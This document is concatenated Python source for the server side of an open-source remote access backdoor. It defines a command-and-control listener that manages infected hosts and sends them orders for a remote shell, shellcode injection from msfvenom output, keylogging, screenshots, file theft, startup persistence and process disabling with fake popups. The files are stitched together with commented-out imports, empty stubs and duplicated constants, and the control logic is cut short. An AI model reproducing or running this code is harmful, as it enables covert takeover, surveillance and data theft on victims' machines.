"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import sys
import os

# append path, needed for all 'main' files
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

#from src.args import Args
#from src import logger
#from src.server.control import Control
#from src.server.socket import Socket
#from src.server.view import View




"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import base64
import socket
import sys
from threading import Thread

#from src import helper, errors
#from src.encrypted_socket import EncryptedSocket
#from src.definitions.commands import *



"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""


class ServerSocket:
    class InvalidIndex(Exception):
        pass


class ClientSocket:
    class KeyloggerError(Exception):
        pass

    class Persistence:
        class StartupError(Exception):
            pass




"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import os
import ctypes


def loadlib(lib):
    path = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), os.pardir))
    return ctypes.CDLL(path + f"/lib/{lib}")


# function to return string with quotes removed
def remove_quotes(string): return string.replace("\"", "")


# function to return title centered around string
def center(string, title): return f"{{:^{len(string)}}}".format(title)


# function to decode bytes
def decode(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode("cp437")
        except UnicodeDecodeError:
            return data.decode(errors="replace")



"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

ERROR = -1
SUCCESS = 0

OK_SENDALL = 1  # used only in encrypted_socket.py

CLIENT_HANDSHAKE = 2
CLIENT_HEARTBEAT = 3
CLIENT_EXIT = 4
CLIENT_ADD_STARTUP = 6
CLIENT_RMV_STARTUP = 7
CLIENT_SCREENSHOT = 8
CLIENT_UPLOAD_FILE = 9
CLIENT_RECV_FILE = 10
CLIENT_LOCK = 11
CLIENT_SHUTDOWN = 12
CLIENT_RESTART = 13
CLIENT_SHELL = 14
CLIENT_PYTHON_INTERPRETER = 15
CLIENT_KEYLOG_START = 16
CLIENT_KEYLOG_STOP = 17
CLIENT_KEYLOG_DUMP = 18
CLIENT_RUN_CMD = 19
CLIENT_DISABLE_PROCESS = 20
SERVER_SHELL_DIR = 21
CLIENT_SHELL_CMD = 22
CLIENT_SHELL_LEAVE = 23
SERVER_COMMAND_RSP = 24
SERVER_FILE_RECV = 25
CLIENT_PYTHON_INTERPRETER_CMD = 26
CLIENT_PYTHON_INTERPRETER_LEAVE = 27
SERVER_PYTHON_INTERPRETER_RSP = 28
SERVER_SCREENSHOT = 29
CLIENT_UPLOAD_FILE_PATH = 30
CLIENT_SHELLCODE = 31

# all menu arguments must be a single char
MENU_HELP = "H"
MENU_LIST_CONNECTIONS = "L"
MENU_INTERACT = "I"
MENU_OPEN_SHELL = "E"
MENU_SEND_ALL_CMD = "S"
MENU_CLOSE_CONNECTION = "C"
MENU_CLOSE_ALL = "X"
MENU_LIST_CONNECTIONS_INACTIVE = "inactive"
EXIT = "EXIT"

SERVER_MAIN_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                            {"arg": MENU_LIST_CONNECTIONS, "info": "List all connections",
                             "optional_arg2": f"({MENU_LIST_CONNECTIONS_INACTIVE})"},
                            {"arg": MENU_INTERACT, "info": "Interact with a connection", "arg2": "index"},
                            {"arg": MENU_OPEN_SHELL, "info": "Open remote shell with connection", "arg2": "index"},
                            {"arg": MENU_SEND_ALL_CMD, "info": "Send command to every connection", "arg2": "command"},
                            {"arg": MENU_CLOSE_CONNECTION, "info": "Close connection", "arg2": "index"},
                            {"arg": MENU_CLOSE_ALL, "info": "Close/clear all connections"},
                            {"arg": EXIT, "info": "Close server"}]

MENU_INTERACT_RECV = "R"
MENU_INTERACT_SEND = "S"
MENU_INTERACT_SCRN = "P"
MENU_INTERACT_STARTUP = "A"
MENU_INTERACT_INFO = "O"
MENU_INTERACT_SHELL = "E"
MENU_INTERACT_PYTHON = "I"
MENU_INTERACT_DISABLE_PROCESS = "D"
MENU_INTERACT_KEYLOG = "K"
MENU_INTERACT_LOCK = "L"
MENU_INTERACT_BACKGROUND = "B"
MENU_INTERACT_CLOSE = "C"
MENU_INTERACT_SHELLCODE = "J"


# arg2 commands
MENU_INTERACT_KEYLOG_START = "start"
MENU_INTERACT_KEYLOG_STOP = "stop"
MENU_INTERACT_KEYLOG_DUMP = "dump"

MENU_INTERACT_STARTUP_ADD = "add"
MENU_INTERACT_STARTUP_RMV = "rmv"

MENU_INTERACT_DISABLE_PROCESS_POPUP = "fake_popup"

SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
                                {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
                                {"arg": MENU_INTERACT_DISABLE_PROCESS, "info": "Toggle disable process",
                                 "arg2": "process_name", "optional_arg3": f"({MENU_INTERACT_DISABLE_PROCESS_POPUP})",
                                 "platform": "windows"},
                                {"arg": MENU_INTERACT_SHELLCODE, "info": "Inject shellcode", "platform": "windows"},
                                {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                 "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
                                {"arg": MENU_INTERACT_RECV, "info": "Receive file"},
                                {"arg": MENU_INTERACT_SEND, "info": "Send file"},
                                {"arg": MENU_INTERACT_SCRN, "info": "Take screenshot"},
                                {"arg": MENU_INTERACT_STARTUP, "info": "Add to startup",
                                 "arg2": f"({MENU_INTERACT_STARTUP_ADD}) ({MENU_INTERACT_STARTUP_RMV})",
                                 "platform": "windows"},
                                {"arg": MENU_INTERACT_INFO, "info": "View information"},
                                {"arg": MENU_INTERACT_LOCK, "info": "Lock computer", "platform": "windows"},
                                {"arg": MENU_INTERACT_BACKGROUND, "info": "Move connection to background"},
                                {"arg": MENU_CLOSE_CONNECTION, "info": "Close connection"}]




"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import json
import logging

from cryptography.fernet import Fernet

#from src.definitions.commands import OK_SENDALL
#from src.logger import LOGGER_ID
BUFFER = 1024


class EncryptedSocket(object):
    def __init__(self):
        self.key = None
        self.encryptor = None
        self.socket = None
        self.logger = logging.getLogger(LOGGER_ID)

    def close(self):
        self.socket.close()

    def recvall(self, buffer, encrypted=True):
        if encrypted and self.encryptor is None:
            raise Exception("Key is not set")

        self.send_json(OK_SENDALL, encrypted=encrypted)

        data = b""
        while len(data) < buffer:
            data += self.socket.recv(BUFFER)

        if encrypted:
            data = self.encryptor.decrypt(data)

        self.logger.debug(f"recvall: {data}")

        return data

    def send(self, data, encrypted=True):
        if not encrypted:
            self.socket.send(data)
        else:
            if self.encryptor is None:
                raise Exception("Key is not set")
            else:
                self.socket.send(self.encryptor.encrypt(data))

    def recv(self, encrypted=True):
        if not encrypted:
            return self.socket.recv(BUFFER)
        else:
            if self.encryptor is None:
                raise Exception("Key is not set")

            return self.encryptor.decrypt(self.socket.recv(BUFFER))

    def recv_json(self, encrypted=True):
        data = self.recv(encrypted).decode()

        self.logger.debug(f"recv: {data}")

        return json.loads(data)

    def send_json(self, key, value=None, encrypted=True):
        command = json.dumps({"key": key, "value": value})

        self.logger.debug(f"send: {command}")

        command = command.encode()

        if encrypted:
            self.send(command)
        else:
            self.send(command, False)

    def sendall_json(self, key, data, sub_value=None, encrypted=True, is_bytes=False):
        if not is_bytes:
            data = data.encode()

        if encrypted:
            data = self.encryptor.encrypt(data)

        self.send_json(key, {"buffer": len(data), "value": sub_value}, encrypted)

        # check to make sure that target received signal to continue with transfer
        if self.recv_json(encrypted)["key"] != OK_SENDALL:
            self.logger.error(f"recvall: failed to get OK signal")
            return

        self.send(data, False)

    def set_key(self, key):
        self.key = key
        self.encryptor = Fernet(self.key)

    def new_key(self):
        self.key = Fernet.generate_key()
        self.encryptor = Fernet(self.key)




class Socket(EncryptedSocket):
    def __init__(self, port):
        super().__init__()

        self.thread_accept = None
        self.port = port
        self.connections = []
        self.addresses = []

        self.new_key()

        self.listener = socket.socket()
        self.socket = None  # socket for a connection

        try:
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                     1)  # reuse a socket even if its recently closed
        except socket.error as e:
            self.logger.error(f"Error creating socket {e}")
            sys.exit(0)

    def listen_asych(self):
        def bind():
            try:
                self.listener.bind(("0.0.0.0", self.port))
                self.listener.listen(20)
            except socket.error() as e:
                self.logger.warning(f"Error binding socket {e}\nRetrying...")
                bind()

        bind()

        self.logger.info(f"Listening on port {self.port}")

        def socket_accept():
            while True:
                try:
                    self.socket, address = self.listener.accept()
                    self.socket.setblocking(1)  # no timeout

                    # first command is always the unencrypted key (as b64)
                    # not the best solution, but sending it raw without wrapped JSON will remove emphasis
                    self.send(base64.b64encode(self.key), False)
                    self.logger.debug(f"send key: {self.key}")

                    while True:
                        # wait for handshake
                        response = self.recv_json()
                        if response["key"] == CLIENT_HANDSHAKE:
                            break

                    address = {"ip": address[0], "port": address[1]} | response["value"] | {"connected": True}

                    if self.socket in self.connections:
                        self.addresses[self.connections.index(self.socket)]["connected"] = True
                    else:
                        self.connections.append(self.socket)
                        self.addresses.append(address)

                    self.logger.info(
                        f"Connection {len(self.connections)} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
                except socket.error as err:
                    self.logger.error(f"Error accepting connection {err}")
                    continue

        self.thread_accept = Thread(target=socket_accept)
        self.thread_accept.daemon = True
        self.thread_accept.start()

    def close_clients(self):
        if len(self.connections) > 0:
            for _, self.socket in enumerate(self.active_connections()):
                try:
                    self.send_json(CLIENT_EXIT)
                    self.socket.close()
                except socket.error:
                    pass
        else:
            self.logger.warning("No connections")

        del self.connections
        del self.addresses
        self.connections = []
        self.addresses = []
        self.socket = None

    def close_one(self, index):
        try:
            self.select(index)
            self.send_json(CLIENT_EXIT)
            self.socket.close()
        except socket.error:
            pass
        except ServerSocket.InvalidIndex as e:
            self.logger.error(e)
            return

        self.addresses[self.connections.index(self.socket)]["connected"] = False
        self.socket = None

    def refresh(self):
        for _, self.socket in enumerate(self.active_connections()):
            try:
                self.send_json(CLIENT_HEARTBEAT)
            except socket.error:
                self.addresses[self.connections.index(self.socket)]["connected"] = False
                self.socket.close()

    def get_curr_address(self):
        return self.addresses[self.connections.index(self.socket)]

    def list(self, inactive=False):
        addresses = []
        # add ID
        for i, address in enumerate(self.addresses):
            if (inactive and not address["connected"]) or (not inactive and address["connected"]):
                address = {"index": str(i + 1)} | address
                addresses.append(address)

        if len(addresses) > 0:
            info = "\n"
            for key in addresses[0]:
                if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                    info += f"{center(str(addresses[0][key]), str(key))}{4 * ' '}"

            info += "\n"

            for i, address in enumerate(addresses):
                for key in address:
                    if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                        info += f"{center(key, address[key])}{4 * ' '}"

                if i < len(addresses) - 1:
                    info += "\n"

            return info
        else:
            _str = "inactive" if inactive else "active"

            self.logger.warning(f"No {_str} connections")
            return ""

    # connection id should be actual index + 1
    def select(self, connection_id):
        try:
            connection_id = int(connection_id)

            if connection_id < 1:
                raise Exception

            self.socket = self.connections[connection_id - 1]

            if not self.addresses[connection_id - 1]["connected"]:
                raise Exception

        except Exception:
            raise ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")

    def send_all_connections(self, key, value, recv=False, recvall=False):
        if self.num_active_connections() > 0:
            for i, self.socket in enumerate(self.active_connections()):

                try:
                    self.send_json(key, value)
                except socket.error:
                    continue

                output = ""

                if recvall:
                    buffer = self.recv_json()["value"]["buffer"]
                    output = self.recvall(buffer).decode()
                elif recv:
                    output = self.recv_json()["value"]

                if output:
                    _info = self.addresses[self.connections.index(self.socket)]
                    self.logger.info(f"Response from connection {str(i+1)} at {_info['ip']}:{_info['port']} \n{output}")
        else:
            self.logger.warning("No active connections")

    def active_connections(self):
        conns = []

        for i, address in enumerate(self.addresses):
            if address["connected"]:
                conns.append(self.connections[i])

        return conns

    def num_active_connections(self):
        count = 0

        for address in self.addresses:
            if address["connected"]:
                count += 1

        return count




"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

from argparse import ArgumentParser


class Args:
    def __init__(self, parent):
        self.parser = ArgumentParser()
        self.parser.add_argument("-d", "--debug", help="debug mode", action="store_true")

        if str(type(parent).__name__) == "MainServer":
            self.parser.add_argument("-p", "--port", help="port number", type=int, default=3000)

    def get_args(self):
        return self.parser.parse_args()


"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import logging.config

LOGGER_ID = "pb_logger"


# https://stackoverflow.com/questions/1343227/can-pythons-logging-format-be-modified-depending-on-the-message-log-level
class CustomFormatter(logging.Formatter):
    grey = "\x1b[38;21m"
    yellow = "\x1b[33;21m"
    red = "\x1b[31;21m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"

    format_detail = "%(asctime)s.%(msecs)03d [%(levelname)s]: %(message)s"
    format = "[%(levelname)s]: %(message)s"

    FORMATS = {
        logging.DEBUG: format_detail,
        logging.INFO: format,
        logging.WARNING: format,
        logging.ERROR: format,
        logging.CRITICAL: format
    }

    def format(self, record):
        formatter = logging.Formatter(self.FORMATS.get(record.levelno), datefmt='%H:%M:%S')

        return formatter.format(record)


def init(_args):
    level = logging.DEBUG if _args.debug else logging.INFO

    logger = logging.getLogger(LOGGER_ID)

    logger.setLevel(level)

    ch = logging.StreamHandler()
    ch.setLevel(level)

    ch.setFormatter(CustomFormatter())

    logger.addHandler(ch)



"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import logging
import os
import re
import socket
import time

#from src import errors, helper
#from src.definitions.commands import *
#from src.logger import LOGGER_ID


class Control:
    def __init__(self, _socket):
        self.socket = _socket
        self.logger = logging.getLogger(LOGGER_ID)

    def shellcode(self):
        _encoding = "x64" if self.socket.get_curr_address()['x64_python'] else "x86"

        print(f"Enter {_encoding} unicode bytes eg. (\\x00\\) shellcode or metasploit py output (enter done or cancel "
              f"when fully entered)")

        data = r""
        while True:
            _input = input()

            if _input.lower() == "done":
                break
            elif _input.lower() == "cancel":
                data = ""
                break
            else:
                data += _input

        if data == "":
            return

        # regular expression to parse the msfvenom output
        buf = re.sub("buf.?(\\+)?=.?.?.?\"", "", data)
        buf = buf.replace("\n", "")
        buf = buf.replace("\"", "")

        self.socket.sendall_json(CLIENT_SHELLCODE, buf)

        try:
            rsp = self.socket.recv_json()
        except socket.error:
            self.logger.critical("Client crashed!")
        else:
            if rsp["key"] == ERROR:
                self.logger.error(rsp["value"])
            elif rsp["key"] == SUCCESS:
                self.logger.info("OK.")

    def info(self):
        out = "\n"
        info = self.socket.get_curr_address()
        for key in info:
            # ignore outputting redundant information
            if key != "connected" and key != "is_unix":
                out += f"{key}: {info[key]}\n"

        print(out, end="")

    def interact(self, index):
        try:
            self.socket.select(index)
            info = self.socket.get_curr_address()
            self.logger.info(f"Connected to {info['ip']}:{info['port']} ({info['hostname']})")
            return True
        except ServerSocket.InvalidIndex as e:
            self.logger.error(e)
            return False

    def startup(self, remove=False):
        if remove:
            self.socket.send_json(CLIENT_RMV_STARTUP)
        else:
            self.socket.send_json(CLIENT_ADD_STARTUP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            self.logger.error(rsp["value"])
        elif rsp["key"] == SUCCESS:
            self.logger.info("OK.")

    def command_shell(self, index=-1):
        if index != -1:
            try:
                self.socket.select(index)
                info = self.socket.get_curr_address()
                self.logger.info(f"Connected to {info['ip']}:{info['port']} ({info['hostname']})")
            except ServerSocket.InvalidIndex as e:
                self.logger.error(e)
                return

        self.socket.send_json(CLIENT_SHELL)

        init = self.socket.recv_json()

        prompt = f"{init['value']}>" if init["key"] == SERVER_SHELL_DIR else ">"

        while True:
            command = input(prompt)

            if command.lower() in ["exit", "exit()"]:
                self.socket.send_json(CLIENT_SHELL_LEAVE)
                break

            elif len(command) > 0:
                self.socket.send_json(CLIENT_SHELL_CMD, command)

                rsp = self.socket.recv_json()

                if rsp["key"] == SERVER_COMMAND_RSP:
                    data = self.socket.recvall(rsp["value"]["buffer"])

                    print(data.decode())
                elif rsp["key"] == SERVER_SHELL_DIR:
                    prompt = f"{rsp['value']}>"

    def python_interpreter(self):
        self.socket.send_json(CLIENT_PYTHON_INTERPRETER)

        while True:
            command = input("python> ")
            if command.strip() == "":
                continue
            if command.lower() in ["exit", "exit()"]:
                break

            self.socket.send_json(CLIENT_PYTHON_INTERPRETER_CMD, command)

            rsp = self.socket.recv_json()

            if rsp["key"] == SERVER_PYTHON_INTERPRETER_RSP:
                data = self.socket.recvall(rsp["value"]["buffer"]).decode("utf-8").rstrip("\n")

                if data != "":
                    print(f"\n{data}")

        self.socket.send_json(CLIENT_PYTHON_INTERPRETER_LEAVE)

    def screenshot(self):
        self.socket.send_json(CLIENT_SCREENSHOT)

        rsp = self.socket.recv_json()

        if rsp["key"] == SERVER_SCREENSHOT:
            buffer = rsp["value"]["buffer"]

            self.logger.info(f"File size: {rsp['value']['value']} bytes")

            data = self.socket.recvall(buffer)

            file = time.strftime("%Y%m%d%H%M%S.png")

            with open(file, "wb") as objPic:
                objPic.write(data)

            self.logger.info(f"Total bytes received: {os.path.getsize(file)} bytes")

    def keylogger_start(self):
        self.socket.send_json(CLIENT_KEYLOG_START)
        self.logger.info("OK.")

    def keylogger_stop(self):
        self.socket.send_json(CLIENT_KEYLOG_STOP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            self.logger.error(rsp["value"])
        elif rsp["key"] == SUCCESS:
            self.logger.info("OK.")

    def keylogger_dump(self):
        self.socket.send_json(CLIENT_KEYLOG_DUMP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            self.logger.error(rsp["value"])
        elif rsp["key"] == SUCCESS:
            print(self.socket.recvall(rsp["value"]["buffer"]).decode())

    def receive_file(self):
        file = os.path.normpath(remove_quotes(input("Target file: ")))
        out_file = os.path.normpath(remove_quotes(input("Output File: ")))

        if file == "" or out_file == "":  # if the user left an input blank
            return

        self.socket.send_json(CLIENT_RECV_FILE, file)

        rsp = self.socket.recv_json()

        if rsp["key"] == SERVER_FILE_RECV:
            buffer = rsp["value"]["buffer"]

            self.logger.info(f"File size: {rsp['value']['value']} bytes")

            file_data = self.socket.recvall(buffer)

            try:
                with open(out_file, "wb") as _file:
                    _file.write(file_data)
            except Exception as e:
                self.logger.error(f"Error writing to file {e}")
                return

            self.logger.info(f"Total bytes received: {len(file_data)} bytes")

        elif rsp["key"] == ERROR:
            self.logger.error(rsp["value"])

    def send_file(self):
        file = os.path.normpath(remove_quotes(input("File to send: ")))

        if not os.path.isfile(file):
            self.logger.error(f"File {file} not found")
            return

        out_file = os.path.normpath(remove_quotes(input("Output File: ")))

        if out_file == "" or file == "":  # if the input is blank
            return

        with open(file, "rb") as _file:
            data = _file.read()
            self.logger.info(f"File size: {len(data)}")
            self.socket.sendall_json(CLIENT_UPLOAD_FILE, data, sub_value=out_file, is_bytes=True)

        rsp = self.socket.recv_json()

        if rsp["key"] == SUCCESS:
            self.logger.info(rsp["value"])
        elif rsp["key"] == ERROR:
            self.logger.error(rsp["value"])

    def toggle_disable_process(self, process, popup=False):
        self.socket.send_json(CLIENT_DISABLE_PROCESS, {"process": process, "popup": popup})

        rsp = self.socket.recv_json()

        if rsp["key"] == SUCCESS:
            self.logger.info(rsp["value"])
        else:
            self.logger.error(rsp["value"])

    def lock(self):
        self.socket.send_json(CLIENT_LOCK)
        self.logger.info("OK.")



"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import socket

import cryptography

#import src.definitions.commands as c
#from src.definitions import platforms
#from src.definitions.commands import *







"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""
import platform

WINDOWS = 0
LINUX = 1
DARWIN = 2
UNKNOWN = -1

UNIX = 3

match platform.system().lower():
    case "linux":
        OS = LINUX
    case "darwin":
        OS = DARWIN
    case 'windows':
        OS = WINDOWS
    case _:
        OS = UNKNOWN



def menu_help(_list, _platform=UNKNOWN):
    out = ""

    for i in range(0, len(_list)):

        if "platform" in _list[i] and _list[i]["platform"] == "windows" and _platform != WINDOWS:
            continue

        out += f"{_list[i]['arg']} {_list[i]['info']}"

        if "arg2" in _list[i]:
            out += f" <{_list[i]['arg2']}>"

        if "optional_arg2" in _list[i]:
            out += f" [{_list[i]['optional_arg2']}]"

        if "optional_arg3" in _list[i]:
            out += f" [{_list[i]['optional_arg3']}]"

        if i != len(_list) - 1:
            out += "\n"

    print(f"\n{out}")


def _input(prompt):
    choice = input(prompt)

    if choice == "":
        return choice

    choice = choice.split(" ")

    choice[0] = choice[0].upper()

    if len(choice) > 1:
        choice[1] = choice[1].lower()

    return choice


class View:
    def __init__(self, control):

        self.ERROR = -1
        self.SUCCESS = 0

        self.OK_SENDALL = 1  # used only in encrypted_socket.py

        self.CLIENT_HANDSHAKE = 2
        self.CLIENT_HEARTBEAT = 3
        self.CLIENT_EXIT = 4
        self.CLIENT_ADD_STARTUP = 6
        self.CLIENT_RMV_STARTUP = 7
        self.CLIENT_SCREENSHOT = 8
        self.CLIENT_UPLOAD_FILE = 9
        self.CLIENT_RECV_FILE = 10
        self.CLIENT_LOCK = 11
        self.CLIENT_SHUTDOWN = 12
        self.CLIENT_RESTART = 13
        self.CLIENT_SHELL = 14
        self.CLIENT_PYTHON_INTERPRETER = 15
        self.CLIENT_KEYLOG_START = 16
        self.CLIENT_KEYLOG_STOP = 17
        self.CLIENT_KEYLOG_DUMP = 18
        self.CLIENT_RUN_CMD = 19
        self.CLIENT_DISABLE_PROCESS = 20
        self.SERVER_SHELL_DIR = 21
        self.CLIENT_SHELL_CMD = 22
        self.CLIENT_SHELL_LEAVE = 23
        self.SERVER_COMMAND_RSP = 24
        self.SERVER_FILE_RECV = 25
        self.CLIENT_PYTHON_INTERPRETER_CMD = 26
        self.CLIENT_PYTHON_INTERPRETER_LEAVE = 27
        self.SERVER_PYTHON_INTERPRETER_RSP = 28
        self.SERVER_SCREENSHOT = 29
        self.CLIENT_UPLOAD_FILE_PATH = 30
        self.CLIENT_SHELLCODE = 31

        # all menu arguments must be a single char
        self.MENU_HELP = "H"
        self.MENU_LIST_CONNECTIONS = "L"
        self.MENU_INTERACT = "I"
        self.MENU_OPEN_SHELL = "E"
        self.MENU_SEND_ALL_CMD = "S"
        self.MENU_CLOSE_CONNECTION = "C"
        self.MENU_CLOSE_ALL = "X"
        self.MENU_LIST_CONNECTIONS_INACTIVE = "inactive"
        self.EXIT = "EXIT"

        self.SERVER_MAIN_COMMAND_LIST = [{"arg": self.MENU_HELP, "info": "Help"},
                                    {"arg": self.MENU_LIST_CONNECTIONS, "info": "List all connections",
                                     "optional_arg2": f"({self.MENU_LIST_CONNECTIONS_INACTIVE})"},
                                    {"arg": self.MENU_INTERACT, "info": "Interact with a connection", "arg2": "index"},
                                    {"arg": self.MENU_OPEN_SHELL, "info": "Open remote shell with connection",
                                     "arg2": "index"},
                                    {"arg": self.MENU_SEND_ALL_CMD, "info": "Send command to every connection",
                                     "arg2": "command"},
                                    {"arg": self.MENU_CLOSE_CONNECTION, "info": "Close connection", "arg2": "index"},
                                    {"arg": self.MENU_CLOSE_ALL, "info": "Close/clear all connections"},
                                    {"arg": self.EXIT, "info": "Close server"}]

        self.MENU_INTERACT_RECV = "R"
        self.MENU_INTERACT_SEND = "S"
        self.MENU_INTERACT_SCRN = "P"
        self.MENU_INTERACT_STARTUP = "A"
        self.MENU_INTERACT_INFO = "O"
        self.MENU_INTERACT_SHELL = "E"
        self.MENU_INTERACT_PYTHON = "I"
        self.MENU_INTERACT_DISABLE_PROCESS = "D"
        self.MENU_INTERACT_KEYLOG = "K"
        self.MENU_INTERACT_LOCK = "L"
        self.MENU_INTERACT_BACKGROUND = "B"
        self.MENU_INTERACT_CLOSE = "C"
        self.MENU_INTERACT_SHELLCODE = "J"

        # arg2 commands
        self.MENU_INTERACT_KEYLOG_START = "start"
        self.MENU_INTERACT_KEYLOG_STOP = "stop"
        self.MENU_INTERACT_KEYLOG_DUMP = "dump"

        self.MENU_INTERACT_STARTUP_ADD = "add"
        self.MENU_INTERACT_STARTUP_RMV = "rmv"

        self.MENU_INTERACT_DISABLE_PROCESS_POPUP = "fake_popup"

        self.SERVER_INTERACT_COMMAND_LIST = [{"arg": self.MENU_HELP, "info": "Help"},
                                        {"arg": self.MENU_INTERACT_SHELL, "info": "Open remote shell"},
                                        {"arg": self.MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
                                        {"arg": self.MENU_INTERACT_DISABLE_PROCESS, "info": "Toggle disable process",
                                         "arg2": "process_name",
                                         "optional_arg3": f"({self.MENU_INTERACT_DISABLE_PROCESS_POPUP})",
                                         "platform": "windows"},
                                        {"arg": self.MENU_INTERACT_SHELLCODE, "info": "Inject shellcode",
                                         "platform": "windows"},
                                        {"arg": self.MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                         "arg2": f"({self.MENU_INTERACT_KEYLOG_START}) ({self.MENU_INTERACT_KEYLOG_STOP}) ({self.MENU_INTERACT_KEYLOG_DUMP})"},
                                        {"arg": self.MENU_INTERACT_RECV, "info": "Receive file"},
                                        {"arg": self.MENU_INTERACT_SEND, "info": "Send file"},
                                        {"arg": self.MENU_INTERACT_SCRN, "info": "Take screenshot"},
                                        {"arg": self.MENU_INTERACT_STARTUP, "info": "Add to startup",
                                         "arg2": f"({self.MENU_INTERACT_STARTUP_ADD}) ({self.MENU_INTERACT_STARTUP_RMV})",
                                         "platform": "windows"},
                                        {"arg": self.MENU_INTERACT_INFO, "info": "View information"},
                                        {"arg": self.MENU_INTERACT_LOCK, "info": "Lock computer", "platform": "windows"},
                                        {"arg": self.MENU_INTERACT_BACKGROUND, "info": "Move connection to background"},
                                        {"arg": self.MENU_CLOSE_CONNECTION, "info": "Close connection"}]

        self.control = control
        self.main_menu()

    def check_input(self, _input, _list, _platform=UNKNOWN):
        for arg in _list:
            if _input[0] == arg["arg"]:
                if "arg2" in arg and len(_input) < 2:
                    self.control.logger.error(f"Missing argument: {arg['arg2']}")
                    return False
                elif "platform" in arg and arg["platform"] == "windows" and _platform != WINDOWS:
                    self.control.logger.error(f"Command '{_input[0]}' is only supported with windows clients")
                    return False

                return True
        self.control.logger.error(f"Command '{_input[0]}' not found, type {MENU_HELP} for Help")
        return False

    def main_menu(self):

        while True:
            choice = _input(">> ")

            self.control.socket.refresh()

            if choice == "":
                continue

            if self.check_input(choice, SERVER_MAIN_COMMAND_LIST):
                match choice[0]:
                    case self.MENU_HELP:
                        menu_help(SERVER_MAIN_COMMAND_LIST)
                    case self.MENU_LIST_CONNECTIONS:
                        if len(choice) > 1:
                            if choice[1] == MENU_LIST_CONNECTIONS_INACTIVE:
                                print(self.control.socket.list(True))
                            else:
                                self.control.logger.error("Invalid argument")
                        else:
                            print(self.control.socket.list())
                    case self.MENU_SEND_ALL_CMD:
                        self.control.socket.send_all_connections(CLIENT_RUN_CMD, choice[1], recvall=True)
                    case self.MENU_INTERACT:
                        if self.control.interact(choice[1]):
                            self.interact_menu()
                    case self.MENU_CLOSE_CONNECTION:
                        self.control.socket.close_one(choice[1])
                    case self.EXIT:
                        exit(1)
                    case self.MENU_CLOSE_ALL:
                        self.control.socket.close_clients()
                    case self.MENU_OPEN_SHELL:
                        self.control.command_shell(choice[1])
                print()

    def interact_menu(self):
        _platform = UNIX if self.control.socket.get_curr_address()['is_unix'] else WINDOWS

        try:
            while True:
                choice = _input("interact>> ")
                self.control.socket.send_json(CLIENT_HEARTBEAT)

                if choice == "":
                    continue

                if self.check_input(choice, SERVER_INTERACT_COMMAND_LIST, _platform):
                    match choice[0]:
                        case self.MENU_HELP:
                            menu_help(SERVER_INTERACT_COMMAND_LIST, _platform)
                        case self.MENU_INTERACT_SEND:
                            self.control.send_file()
                        case self.MENU_INTERACT_RECV:
                            self.control.receive_file()
                        case self.MENU_INTERACT_SCRN:
                            self.control.screenshot()
                        case self.MENU_INTERACT_STARTUP:
                            if choice[1] == self.MENU_INTERACT_STARTUP_ADD:
                                self.control.startup()
                            elif choice[1] == self.MENU_INTERACT_STARTUP_RMV:
                                self.control.startup(True)
                            else:
                                self.control.logger.error("Invalid argument")
                        case self.MENU_INTERACT_INFO:
                            self.control.info()
                        case self.MENU_INTERACT_SHELL:
                            self.control.command_shell()
                        case self.MENU_INTERACT_PYTHON:
                            self.control.python_interpreter()
                        case self.MENU_INTERACT_KEYLOG:
                            if choice[1] == self.MENU_INTERACT_KEYLOG_START:
                                self.control.keylogger_start()
                            elif choice[1] == self.MENU_INTERACT_KEYLOG_STOP:
                                self.control.keylogger_stop()
                            elif choice[1] == self.MENU_INTERACT_KEYLOG_DUMP:
                                self.control.keylogger_dump()
                            else:
                                self.control.logger.error("Invalid argument")
                        case self.MENU_INTERACT_DISABLE_PROCESS:
                            self.control.toggle_disable_process(choice[1], True if len(choice) > 2 and choice[
                                2] == MENU_INTERACT_DISABLE_PROCESS_POPUP else False)
                        case self.MENU_INTERACT_LOCK:
                            self.control.lock()
